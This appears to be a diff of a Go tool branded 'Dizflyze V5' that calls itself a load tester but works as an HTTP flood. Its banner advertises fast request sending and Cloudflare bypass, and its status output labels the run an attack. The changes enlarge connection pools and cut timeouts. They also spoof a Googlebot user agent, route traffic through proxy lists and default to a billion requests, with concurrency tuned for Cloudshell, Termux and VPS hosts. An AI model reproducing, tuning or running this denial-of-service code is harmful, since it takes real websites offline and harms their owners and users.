@@ -1,3 +1,4 @@
+
 package main
 
 import (
@@ -62,16 +63,17 @@ func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time
 			return url.Parse(proxyStr)
 		}
 	}
+	// Jangan di otak atik ini udah pas super fast
 	transport := &http.Transport{
 		Proxy:               proxyFunc,
-		MaxIdleConns:        25000,
-		MaxIdleConnsPerHost: 25000,
+		MaxIdleConns:        30000,
+		MaxIdleConnsPerHost: 30000,
 		IdleConnTimeout:     3 * time.Second,
-		TLSHandshakeTimeout: 3 * time.Second,
+		TLSHandshakeTimeout: 1 * time.Second,
 		DialContext: (&net.Dialer{
-			Timeout:   3 * time.Second,
-			KeepAlive: 3 * time.Second,
-			DualStack: true,
+			Timeout:   2 * time.Second,
+			KeepAlive: 3 * time.Second, 
+			DualStack: true, // Jangan di set ulang
 		}).DialContext,
 	}
 	if err := http2.ConfigureTransport(transport); err != nil {
@@ -80,9 +82,6 @@ func NewLoadTester(Link string, numRequests int64, concurrency int, timeout time
 	client := &http.Client{
 		Transport: transport,
 		Timeout:   timeout,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
 	}
 
 	return &LoadTester{
@@ -150,36 +149,21 @@ func (lt *LoadTester) run(ctx context.Context, wg *sync.WaitGroup) {
 }
 
 func printLogo() {
-	logo := "" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣄⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n" +
-		"⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉\n" +
-		"⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿\n" +
-		"⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀\n" +
-		"⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n" +
-		"⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁\n" +
-		"┌──────                   ┌──────\n" +
-		"  DIZ FLYZE PRIVATE         FAST SEND REQUESTS\n" +
-		"  JATENG X PLOIT V5         6 BYPAS CLOUDFLARE\n" +
-		"              ──────┘                    ──────┘\n"
+	logo := `
+⠀⠀⠀⠀⢀⠀⢀⣼⣷⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⡄⠀
+⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷
+⠀⠀⠀⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣷⣿⣿⠋⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⡟⠛
+⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣝⣿⣽⣿⣿⣿⠿⣏⣉⡍⠉⠉⠉⠉⠙⠛⠻⠿⠿⠿⠿⣿⣿⣿⡇⠀
+⠘⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣩⣿⣿⣿⣿⣿⣦⣈⣻⣃⣠⠶⠒⠒⠒⠒⠒⠛⠛⠛⠛⠛⠋⠉⠁⠀
+⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⣾⠋⠀⠀⣿⠃⠀⠀⠈⢳⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣷⣿⣄⠀⠀⠹⣆⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⠶⢤⣬⣧⣤⠶⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
+⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀     ⠀⠀
+⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀Dizflyze V5 - Fasteres
+⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⡇⠀⠀⠀⠀⠀⠀
+⠘⠛⠛⠛⣿⣿⣿⣿⠣⢾⣧
+`
 	fmt.Println(logo)
 }
 
@@ -201,47 +185,33 @@ func animate(ctx context.Context, lt *LoadTester, initialCycleDuration, summaryD
 			var avgLatency int64
 			if done > 0 {
 				avgLatency = atomic.LoadInt64(&lt.totalLatency) / done / 1e6
-			}
+			} // Jangan di set ulang
 			if elapsed >= currentCycleDuration {
 				total := done
-				summary := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
+				summary := fmt.Sprintf("%s %s %s %s %s %s",
 					    Putih("\n "),
- 					   Cyan("["),
-					    Putih("BERHASIL"),
-					    Cyan("]"),
-  					  Hijau(":"),
-                        Cyan("["),
-   					 Putih(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
- 					   Putih("DETIK"),
-                        Cyan("]"),
-   					 Hijau(":"),
-                        Cyan("["),
+					    Putih("➤"),
+   					 Cyan(fmt.Sprintf("%d", int(currentCycleDuration.Seconds()))),
+ 					   Cyan("TIME"),
+                        Putih("➤"),
   					  Hijau(fmt.Sprintf("%d", total)),
-                        Putih("REQUESTS"),
-                        Cyan("]"),
 		    	)
 				fmt.Println(summary)
 				time.Sleep(summaryDuration)
 				fmt.Print("\033[2A\033[J")
 				currentCycleDuration += 60 * time.Second
 				startCycle = time.Now()
-			} else {
+			} else { // Jangan di set ulang
 				remaining := currentCycleDuration - elapsed
 				timerStr := fmt.Sprintf("%02d:%02d", int(remaining.Minutes()), int(remaining.Seconds())%60)
-				line := fmt.Sprintf("%s %s %s %s %s %s %s %s %s %s %s %s %s %s",
+				line := fmt.Sprintf("%s %s %s %s %s %s %s %s",
 			    	Cyan(symbols[symbolIndex%len(symbols)]),
-			    	Merah("["),
-					Putih("SERANGAN"),
-					Merah("]"),
-					Kuning(":"),
 					Merah("["),
                     Hijau(timerStr),
 					Merah("]"),
-					Putih("RPS"),
-					Kuning(":"),
+					Putih("➤"),
 					Hijau(fmt.Sprintf("%d", pending)),
-					Putih("AVG"),
-					Kuning(":"),
+					Putih("➤"),
                     Hijau(fmt.Sprintf("%d", avgLatency)),
 				)
 				symbolIndex++
@@ -280,9 +250,9 @@ func main() {
 	rand.Seed(time.Now().UnixNano())
 	configPath := flag.String("config", "", "FILE JSON")
 	requestsFlag := flag.Int64("requests", 1000000000, "TOTAL REQUESTS")
-	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")
-	timeoutFlag := flag.Float64("timeout", 3, "WAKTU SETIAP REQUEST (detik)")
-	methodFlag := flag.String("method", "GET", "HTTP METHOD (GET/POST/ETC)")
+	concurrencyFlag := flag.Int("concurrency", 550, "CONCURRENCY")  //550 Cloudshell & 200 Termux & 750 Vps.
+	timeoutFlag := flag.Float64("timeout", 3, "WAKTU SETIAP REQUEST") // Jangan di set ulang
+	methodFlag := flag.String("method", "GET", "HTTP METHOD")
 	logFlag := flag.String("log", "ERROR", "DEBUG, INFO, WARNING, ERROR")
 	noLiveFlag := flag.Bool("no-live", false, "MATIKAN LIVE OUTPUT")
 	proxyFile := flag.String("proxy", "", "FILE PROXY")
@@ -316,8 +286,8 @@ func main() {
 	}
 	method := strings.ToUpper(*methodFlag)
 	headers := map[string]string{
-		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-		"Connection": "keep-alive",
+		"User-Agent":      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", // Jangan di set ulang
+		"Connection": "keep-alive", // Jangan di set ulang
 	}
 	var proxies []string
 	if *proxyFile != "" {
@@ -337,7 +307,7 @@ func main() {
 	fmt.Print("\033[H\033[2J")
 	printLogo()
 	var Link string
-	fmt.Print(Cyan("\nMASUKAN LINK: "))
+	fmt.Print(Putih("➤ "))
 	fmt.Scanln(&Link)
 	
 	lt := NewLoadTester(Link, numRequests, concurrency, time.Duration(timeoutSec*float64(time.Second)), method, headers, proxies)
